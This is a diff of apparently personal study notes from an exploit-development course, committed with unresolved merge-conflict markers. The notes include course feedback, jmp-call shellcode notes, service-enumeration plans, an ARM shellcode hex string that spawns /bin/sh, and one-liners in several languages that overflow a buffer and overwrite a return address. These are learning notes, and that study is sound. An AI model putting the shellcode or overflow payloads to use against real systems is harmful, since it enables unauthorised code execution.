@@ -1,3 +1,4 @@
+<<<<<<< HEAD
 assembly stuff
 edb-debugger -- https://github.com/eteran/edb-debugger (depends on good stuff used)
 bit and bitwise operations
@@ -71,3 +72,78 @@ perl -e 'print "a"x32 . "\x9d\x84\x04\x08"'
 php -r 'echo str_repeat("a",32) . "\x9d\x84\x04\x08";'
 
 -A INPUT -i p2p-wlan+ -p tcp -m tcp --dport 5000 -j SECMARK --selctx u:object_r:server_packet_t:s0
+=======
+assembly stuff
+edb-debugger -- https://github.com/eteran/edb-debugger (depends on good stuff used)
+bit and bitwise operations
+and,or,xor,not
+
+points to discuss with Hamza
+- RCX value change in forever loop program 
+- No mention of gdb-peda for examples before "debugging in linux topic" but it used quite a few times in "assembly language in linux" chapter
+- stepi in hellow world gcc , does step into another world when debugging
+- shellcode generation with hamza command does not work and has extraa bad cahrs
+- why are arguments pushed in reverse order on stack
+- 10.90.30.218 IP does not translate by nasm - signed dword immediate exceeds bounds
+- first msfvenom command - has eerror as arch is specd as 64 instead of x86_64, payload used correctly
+- win buffer2 cannot locate text string in immunitty
+- winexe's for shellbind do not run as AV blocks them
+- Real World and Exploit development, does not explains the details of techniques, it just shows the commands to do so.
+- ROP, SEH, MONA py, Immunity debugger, egdb, peda are not explained as much as they are required.
+- There should also be practice exercises and some more links to sample programs to exploit
+
+
+After running shellcode test multiple times, it keeps spitting segfault
+- jmp-call technique is to have the address of string to be pushed on the stack as a part of return address before a func is called
+call code
+string "hello" >> - before cjumoping to code, address of hello string is pushed on to the stack, then in code, we pop this adress off of the stack to rsi and use it later
+
+gdb> run $(python <path-to-command> A 20)
+abhi00x-Lamitron1
+
+stack.nasm ch05 does not work as expected
+
+target evaluation
+- find ip's up without interaction
+- find common services, and try to connect to them
+- enumerate services
+
+telnet, ssh, ftp, smtp - 
+Look for common ports and enumerate their services
+- Build a tcp/udp port corresponding to common services name in dict, or tuple
+- Identify service and a way to connect to that service over that port to find if alive
+
+For http service -
+- form a GET requests using python requests
+- and fetch response for it
+- WS - ok
+
+For FTP service -
+- browser request can be sent - need to enable (network.security.ports.banned.override ->> set to 1-1024) as new variable in about:config
+- This gave out FTP service used along with its version
+- - WS - ok
+
+arm shellcode
+\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x40\x40\x78\x44\x0c\x30\x49\x40\x52\x40\x0b\x27\x01\xdf\x01\x27\x01\xdf\x2f\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x40\x40\x78\x44\x0c\x30\x49\x40\x52\x40\x0b\x27\x01\xdf\x01\x27\x01\xdf\x2f\x2f\x62\x69\x6e\x2f\x2f\x73\x68
+
+for buffer overflow
+examine memory
+crash exactly on 32 bytes of a 20 byte buffer
+we wrote over RET with another dword of DDDD.
+When the function exited, it read the value stored in RET, which is now
+0x44444444, the hexadecimal equivalent of DDDD, and attempted to jump to
+this address. This address is not a valid address, or is in protected address
+space, and the program terminated with a segmentation fault.
+
+$(python -c 'print "a"*32 + "\x9d\x84\x04\x08"') --correct
+
+ruby -e 'print "a"*32 + "\x9d\x84\x04\x08"'
+
+python -c 'print "a"*32 + "\x9d\x84\x04\x08"'
+
+perl -e 'print "a"x32 . "\x9d\x84\x04\x08"'
+
+php -r 'echo str_repeat("a",32) . "\x9d\x84\x04\x08";'
+
+-A INPUT -i p2p-wlan+ -p tcp -m tcp --dport 5000 -j SECMARK --selctx u:object_r:server_packet_t:s0
+>>>>>>> b9d3ed415777178279d005b9791114d7aa1a5200
